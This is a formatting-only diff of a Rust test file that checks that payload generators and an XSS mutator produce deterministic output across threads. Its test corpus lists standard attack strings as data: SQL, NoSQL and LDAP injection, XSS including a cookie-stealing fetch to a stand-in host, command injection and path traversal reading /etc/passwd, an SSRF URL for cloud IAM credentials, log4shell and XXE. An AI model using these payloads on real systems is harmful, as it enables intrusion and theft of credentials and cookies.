@@ -33,15 +33,24 @@ const CORPUS: &[(&str, &str)] = &[
     ("sql", "1' OR '1'='1'-- -"),
     ("sql", "1 UNION SELECT username,password FROM users-- -"),
     ("xss", "<svg onload=alert(1)>"),
-    ("xss", "<img src=x onerror=fetch('//evil.tld/c?'+document.cookie)>"),
+    (
+        "xss",
+        "<img src=x onerror=fetch('//evil.tld/c?'+document.cookie)>",
+    ),
     ("cmdi", "; cat /etc/passwd #"),
     ("path", "../../../../etc/passwd"),
     ("ssti", "{{7*7}}"),
     ("ldap", "*)(|(uid=*"),
-    ("ssrf", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
+    (
+        "ssrf",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    ),
     ("nosql", r#"{"username":{"$ne":null},"pw":{"$regex":".*"}}"#),
     ("log4shell", "${jndi:ldap://10.0.0.1:1389/Basic/Command/x}"),
-    ("xxe", r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>"#),
+    (
+        "xxe",
+        r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>"#,
+    ),
 ];
 
 /// THE flaky-bug detector: a generator must be a pure function of
@@ -71,16 +80,25 @@ fn generators_are_pure_not_hashset_order_dependent() {
             "{class} generator is NOT deterministic across threads — \
              output depends on HashSet iteration order (flaky bug)"
         );
-        assert!(!main.is_empty(), "{class}: empty for a real attack {payload:?}");
+        assert!(
+            !main.is_empty(),
+            "{class}: empty for a real attack {payload:?}"
+        );
     }
     // The XSS grammar mutator (scald's surface) — same contract.
     for &(class, payload) in CORPUS.iter().filter(|(c, _)| *c == "xss") {
         let _ = class;
         let p = payload.to_string();
         let t = std::thread::spawn(move || {
-            gxss::mutate(&p, 60).into_iter().map(|m| m.payload).collect::<Vec<_>>()
+            gxss::mutate(&p, 60)
+                .into_iter()
+                .map(|m| m.payload)
+                .collect::<Vec<_>>()
         });
-        let main: Vec<_> = gxss::mutate(payload, 60).into_iter().map(|m| m.payload).collect();
+        let main: Vec<_> = gxss::mutate(payload, 60)
+            .into_iter()
+            .map(|m| m.payload)
+            .collect();
         assert_eq!(
             main,
             t.join().unwrap(),
